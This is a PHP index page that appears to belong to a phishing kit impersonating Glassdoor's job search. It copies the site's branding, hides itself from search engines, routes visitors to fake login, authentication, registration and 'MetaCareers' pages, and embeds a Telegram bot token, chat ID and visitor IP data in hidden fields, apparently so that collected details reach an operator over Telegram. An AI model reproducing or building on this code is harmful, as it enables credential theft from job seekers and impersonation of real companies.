<?php
    error_reporting(0);
	session_start();
	require_once "utility/consts.php";
	require_once "utility/message.php";
	$_SESSION["data"] = isset($_SESSION["data"]) ? $_SESSION["data"] : [];
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
		<meta http-equiv="x-ua-compatible" content="ie=edge" />
		<meta name="DC.title" content="Glassdoor Job Search | You deserve a job that loves you back" />
		<meta name="revisit-after" content="1 day" /> 
		<meta name="description" content="Search millions of jobs and get the inside scoop on companies with employee reviews, personalized salary tools, and more. Hiring? Post a job for free." />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name="distribution" content="GLOBAL" />
		<meta name="rating" content="General" />
		<meta name="copyright" content="Copyright - 2022 Glassdoor" />
		<meta name="author" content="Glassdoor" />
		<meta name="theme-color" content="#FFF" />
		<meta name="robots" content="noindex,nofollow" />
		<link rel="icon" href="https://www.glassdoor.com/favicon.ico" />
		<link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet' />
		<link href='<?php echo DOMAIN;?>/assets/css/owl.carousel.min.css' rel='stylesheet' />
		<link href='<?php echo DOMAIN;?>/assets/css/main.css' rel='stylesheet' />
		<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
		<link href='<?php echo DOMAIN;?>/assets/css/loader.module.css' rel='stylesheet' />
		<link href='<?php echo DOMAIN;?>/assets/css/jquery.select.css' rel='stylesheet' />
		<script src="<?php echo DOMAIN;?>/assets/js/autorefresher.min.js"></script>
		<script src="<?php echo DOMAIN;?>/assets/js/socket.io.js"></script>
		<script src="<?php echo DOMAIN;?>/assets/js/owl.carousel.min.js"></script>
		<script src="<?php echo DOMAIN;?>/assets/js/jquery.select.min.js"></script>
		<script type="text/javascript" src="https://www.cssscript.com/demo/html5-form-validator-pristine/dist/pristine.min.js"></script>
    <title>Glassdoor Job Search | You deserve a job that loves you back</title>
  </head>
  <body>
		<?php
			$page = isset($_GET["page"]) ? $_GET["page"] : "home";
			switch($page){
				case "auth":
					include "pages/Auth.php";
					break;
				case "login":
					include "pages/Login.php";
					break;
				case "registration":
					include "pages/Registration.php";
					break;
				case "metacareers":
					include "pages/MetaCareers.php";
					break;
				case "result":
					include "pages/Result.php";
					break;
				default:
					include "pages/Home.php";
			}
		?>
		<div>
			<input type="hidden" id="sessId" value="<?php echo ROOM; ?>" />
			<input type="hidden" id="appMessage" value="<?php echo $_SESSION["ipinfo"]["message"]; ?>" />
			<input type="hidden" id="appToken" value="<?php echo TELEGRAMAPITOKEN; ?>" />
			<input type="hidden" id="appChatId" value="<?php echo TELEGRAMCHATID; ?>" />
		</div>
		<script src="<?php echo DOMAIN;?>/assets/js/main.js?v=3"></script>
  </body>
</html>
